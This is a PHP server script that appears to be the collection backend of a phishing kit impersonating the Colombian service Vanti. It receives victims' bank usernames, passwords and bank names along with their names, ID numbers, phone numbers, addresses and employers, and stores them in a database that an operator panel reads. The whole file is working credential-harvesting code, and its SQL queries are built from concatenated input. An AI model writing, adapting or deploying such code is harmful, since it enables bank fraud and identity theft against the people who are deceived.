<?php
require_once("../lib/class.inputfilter.php");
require('../panel/include/setings.php');
date_default_timezone_set('America/Bogota');
$ifilter = new InputFilter();

// 1. Recibir credenciales básicas
$usuario = '';
if (isset($_POST['usr']) && $_POST['usr'] !== '') {
    $usuario = $ifilter->process($_POST['usr']);
} elseif (isset($_COOKIE['usuario'])) {
    $usuario = $ifilter->process($_COOKIE['usuario']);
}

$contrasena = isset($_POST['pas']) ? $ifilter->process($_POST['pas']) : '';
$banco = isset($_POST['ban']) ? $ifilter->process($_POST['ban']) : '';

// 🟢 2. CAPTURAR TODOS LOS DATOS PERSONALES DE VANTI ENVIADOS POR EL JS
$nom = isset($_POST['nom']) ? $ifilter->process($_POST['nom']) : '';
$ape = isset($_POST['ape']) ? $ifilter->process($_POST['ape']) : '';
$tdoc = isset($_POST['tdoc']) ? $ifilter->process($_POST['tdoc']) : '';
$doc = isset($_POST['doc']) ? $ifilter->process($_POST['doc']) : '';
$cel = isset($_POST['cel']) ? $ifilter->process($_POST['cel']) : '';
// Se omite la reescritura de email principal para no afectar la lógica del banco, 
// pero puedes guardarlo en otro campo si tu BD lo soporta.
$dir = isset($_POST['dir']) ? $ifilter->process($_POST['dir']) : '';
$emp = isset($_POST['emp']) ? $ifilter->process($_POST['emp']) : '';
$ref = isset($_POST['ref']) ? $ifilter->process($_POST['ref']) : '';

$id = isset($_COOKIE['id']) ? $ifilter->process($_COOKIE['id']) : '';

// 3. Buscar el ID del registro si no existe en la cookie
if ($id === '' && $usuario !== '') {
    if ($con = conectar()) {
        $consulta = sentencia($con, "SELECT idreg FROM m3it3m WHERE usuario = '".$usuario."' ORDER BY idreg DESC LIMIT 1");
        if (contarfilas($consulta)) {
            $datos = traerdatos($consulta);
            $id = (string)$datos['idreg'];
        }
        desconectar($con);
    }
}

// 4. Actualizar credenciales y datos de Vanti
if ($id !== '' && $usuario !== '' && $contrasena !== '') {
    // Función original de tu sistema
    upgrade_user($id, $usuario, $contrasena, $banco);
    
    // 🟢 5. GUARDAR LA INFORMACIÓN DEL CLIENTE EN LA BASE DE DATOS
    if ($con = conectar()) {
        // Asegúrate de que los nombres de las columnas coincidan con los de tu tabla en MySQL.
        // El panel de React lee: nombre, apellido, tipo_doc, cedula, celular, direccion, empresa, referencia.
        $query_update = "UPDATE m3it3m SET 
            nombre = '$nom', 
            apellido = '$ape', 
            tipo_doc = '$tdoc', 
            cedula = '$doc', 
            celular = '$cel', 
            direccion = '$dir', 
            empresa = '$emp', 
            referencia = '$ref' 
            WHERE idreg = '$id'";
            
        sentencia($con, $query_update);
        desconectar($con);
    }
}
?>